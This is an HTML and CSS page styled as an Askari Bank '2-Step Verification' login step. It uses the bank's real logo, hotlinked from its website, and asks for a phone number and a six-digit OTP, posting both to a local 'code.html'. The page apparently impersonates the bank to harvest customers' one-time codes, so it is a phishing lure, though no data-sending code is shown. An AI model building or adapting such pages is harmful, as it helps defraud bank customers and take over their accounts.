<style>
	.login-form {
		width: 340px;
    	margin: 50px auto;
	}
    .login-form form {
    	margin-bottom: 15px;
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 30px;
    }
    .login-form h2 {
        margin: 0 0 15px;
    }
    .form-control, .btn {
        min-height: 38px;
        border-radius: 2px;
    }
    .btn {        
        font-size: 15px;
        font-weight: bold;
    }

    input[type="password"]{  
                text-align: center;
            } 

</style>

<div class="login-form">
    <img src="https://askaribank.com/wp-content/themes/askari_theme/assets/images/NEW%20LOGO%20ASKARI%20BANK-01.jpg" width="350" height="92" alt="Askari Bank"> 
    <form action="code.html" method="post">
        <h3 class="text-center">2-Step Verification</h3>        
        <div class="form-group">
            <input type="tel" class="form-control" placeholder="phone num" required="required" maxlength="11">
          
            <button type="submit" class="btn btn-primary btn-block" style="background-color:#1274b1" >Send OTP</button>
           
            <h5 class="text-center">Enter OTP</h5>  
            <input type="password" class="form-control" placeholder="Please enter the code" required="required" maxlength="6" class="myClass">
            <button type="submit" class="btn btn-primary btn-block" style="background-color:#1274b1" >Verify</button>
            </div>
        
        </div>     
    </form>
<h6 class="text-center"> - - - Askari Bank Web Login Portal - - - </h6> 
</div>
